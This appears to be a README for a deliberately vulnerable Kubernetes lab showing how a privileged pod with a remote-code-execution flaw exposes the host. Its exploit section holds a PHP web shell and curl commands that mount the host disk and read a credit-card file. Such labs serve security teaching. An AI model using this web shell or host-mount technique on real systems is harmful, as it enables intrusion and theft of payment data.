# Privileged Pod

## Context
Privileged pod (AKA `privileged`) is one of the Security Context flags for a Pod or Container.
Privileged containers can do nearly everything a process on the host can do, and provide no isolation from other workloads. This kind of a setting should be avoided where possible.

## Env components
### Web
Vulnerable application with RCE and privileged access.

* Deployment - `k8s/PrivilegedPod/web/deployment.yaml`

    This `k8s` deployment contains the unsecured instruction `privileged: true`
* Service - `k8s/PrivilegedPod/web/service.yaml`

### Payment
Payments processing microservice. Completely protected ;).

* Deployment - `k8s/PrivilegedPod/payment/deployment.yaml`
* Service - `k8s/PrivilegedPod/payment/service.yaml`

## Exploit

Your target is to steal users credit cards. Cards data is located in `payment` microservice (which has no security issues). But `web` microservice has an RCE vulnerability (and has `privileged`). This allows us to access any data in the cluster, including cards data.

1. Upload file `shell.php`:
    ```php
    <?php
    echo '<pre>';
    var_dump(system($_GET['cmd']));
    echo '</pre>';
    ```
2. Create temporary directory for host file system `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mkdir%20/tmp/host`
3. Mount host's file system (`sda1` in my case but could vary) `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mount%20/dev/sda1%20/tmp/host`
4. Find file `cards.json` in hosts filesystem `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=find%20/tmp/host%20-name%20"cards.json"`
5. Get stored cards `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=cat%20<👆>`
